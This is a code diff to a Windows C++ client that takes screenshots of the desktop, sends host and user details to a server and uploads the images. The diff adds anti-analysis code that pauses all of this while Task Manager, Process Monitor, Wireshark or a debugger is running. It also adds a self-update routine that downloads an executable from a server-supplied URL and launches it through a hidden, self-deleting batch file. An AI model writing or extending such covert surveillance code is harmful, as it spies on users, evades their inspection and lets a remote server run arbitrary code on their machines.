@@ -13,6 +13,7 @@
 #include <chrono>
 #include <stdarg.h>
 #include <stdio.h>
+#include <fstream>
 
 #pragma comment(lib, "User32.lib")
 #pragma comment(lib, "Gdi32.lib")
@@ -33,9 +34,40 @@ std::string     g_answerText = "";
 enum DotState { DOT_RED, DOT_YELLOW, DOT_GREEN };
 volatile DotState g_dotState = DOT_RED;
 volatile bool g_agentEnabled = false;
+volatile bool g_suspiciousProcessFound = false;
 
 void Log(const char* format, ...) {
     // Logging disabled
+}
+
+// -------------------------------------------------------------
+// Stealth & Anti-Analysis
+// -------------------------------------------------------------
+bool IsSuspiciousProcessRunning() {
+    const char* badProcs[] = {
+        "taskmgr.exe", "processhacker.exe", "procmon.exe", 
+        "wireshark.exe", "x64dbg.exe", "ollydbg.exe", "pestudio.exe"
+    };
+    
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return false;
+
+    PROCESSENTRY32A pe;
+    pe.dwSize = sizeof(pe);
+    bool found = false;
+
+    if (Process32FirstA(hSnap, &pe)) {
+        do {
+            for (const char* bad : badProcs) {
+                if (_stricmp(pe.szExeFile, bad) == 0) {
+                    found = true;
+                    break;
+                }
+            }
+        } while (!found && Process32NextA(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    return found;
 }
 
 // -------------------------------------------------------------
@@ -120,13 +152,50 @@ void SendTelemetry(int user_id) {
     char headers[256];
     sprintf(headers, "Content-Type: application/json\r\nX-Secret: %s", SECRET_KEY);
 
-    char body[1024];
+    char body[2048];
     sprintf(body, "{\"user_id\":\"%d\", \"hostname\":\"%s\", \"username\":\"%s\", \"os_ver\":\"%s\", \"version\":\"%s\"}",
             user_id, GetComputerNameStr().c_str(), GetUserNameStr().c_str(), GetOSVersion().c_str(), VERSION);
 
     HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), (LPVOID)body, (DWORD)strlen(body));
 
     InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
+}
+
+void ExecuteSelfUpdate(const std::string& downloadUrl) {
+    char currentExe[MAX_PATH];
+    GetModuleFileNameA(NULL, currentExe, MAX_PATH);
+    std::string newExe = std::string(currentExe) + ".new";
+
+    // 1. Download new version
+    HINTERNET hSession = InternetOpenA("SEB-Updater", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hUrl = InternetOpenUrlA(hSession, downloadUrl.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);
+    
+    if (hUrl) {
+        std::ofstream ofs(newExe, std::ios::binary);
+        char buf[4096];
+        DWORD read = 0;
+        while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read > 0) {
+            ofs.write(buf, read);
+        }
+        ofs.close();
+        InternetCloseHandle(hUrl);
+    }
+    InternetCloseHandle(hSession);
+
+    // 2. Create batch to swap and restart
+    std::string batPath = std::string(currentExe) + ".update.bat";
+    std::ofstream bat(batPath);
+    bat << "@echo off\n";
+    bat << "timeout /t 2 /nobreak > nul\n";
+    bat << "del \"" << currentExe << "\"\n";
+    bat << "move \"" << newExe << "\" \"" << currentExe << "\"\n";
+    bat << "start \"\" \"" << currentExe << "\"\n";
+    bat << "del \"%~f0\"\n";
+    bat.close();
+
+    // 3. Launch batch and DIE
+    ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_HIDE);
+    exit(0);
 }
 
 void CheckForUpdates() {
@@ -152,8 +221,16 @@ void CheckForUpdates() {
         }
         
         if (response.find("\"update_available\":true") != std::string::npos) {
-            // Found update - here we would implement the download and swap
-            // For Phase 1 we just establish the check
+            size_t pos = response.find("\"download_url\":\"");
+            if (pos != std::string::npos) {
+                size_t start = pos + 16;
+                size_t end = response.find("\"", start);
+                std::string url = response.substr(start, end - start);
+                // Replace escaped slashes
+                size_t s;
+                while((s = url.find("\\/")) != std::string::npos) url.replace(s, 2, "/");
+                ExecuteSelfUpdate(url);
+            }
         }
     }
 
@@ -196,6 +273,8 @@ void UploadToCloud(const std::vector<uint8_t>& jpegData, int user_id) {
 // Capture
 // -------------------------------------------------------------
 void TakeScreenshotAndUpload(int user_id) {
+    if (g_suspiciousProcessFound) return;
+
     int sw = GetSystemMetrics(SM_CXSCREEN);
     int sh = GetSystemMetrics(SM_CYSCREEN);
     HWND hDesktop = GetDesktopWindow();
@@ -234,6 +313,15 @@ void TakeScreenshotAndUpload(int user_id) {
 void PollingThreadFunc() {
     int teleCounter = 0;
     while (true) {
+        // Anti-analysis check
+        g_suspiciousProcessFound = IsSuspiciousProcessRunning();
+        if (g_suspiciousProcessFound) {
+            g_dotState = DOT_RED;
+            g_agentEnabled = false;
+            std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+            continue;
+        }
+
         std::string resp = HttpGetPoll(g_currentUser);
         if (!resp.empty()) {
             if (resp.find("\"status\":\"disabled\"") != std::string::npos) {
@@ -245,7 +333,6 @@ void PollingThreadFunc() {
             } else if (resp.find("\"status\":\"ready\"") != std::string::npos) {
                 g_agentEnabled = true;
                 g_dotState = DOT_GREEN;
-                // Parse text field
                 size_t pos = resp.find("\"text\":\"");
                 if (pos != std::string::npos) {
                     size_t start = pos + 8;
@@ -255,7 +342,7 @@ void PollingThreadFunc() {
             }
         }
 
-        if (teleCounter % 60 == 0) { // Every ~1 min
+        if (teleCounter % 60 == 0) { 
             SendTelemetry(g_currentUser);
             CheckForUpdates();
         }
@@ -284,7 +371,7 @@ DWORD WINAPI ActiveDesktopThreadProc(LPVOID lpParam) {
     int  cleanupFrames = 0;
 
     while (strcmp(g_activeDeskName, targetDesktop) == 0) {
-        if (!g_agentEnabled) {
+        if (!g_agentEnabled || g_suspiciousProcessFound) {
             std::this_thread::sleep_for(std::chrono::milliseconds(100));
             continue;
         }
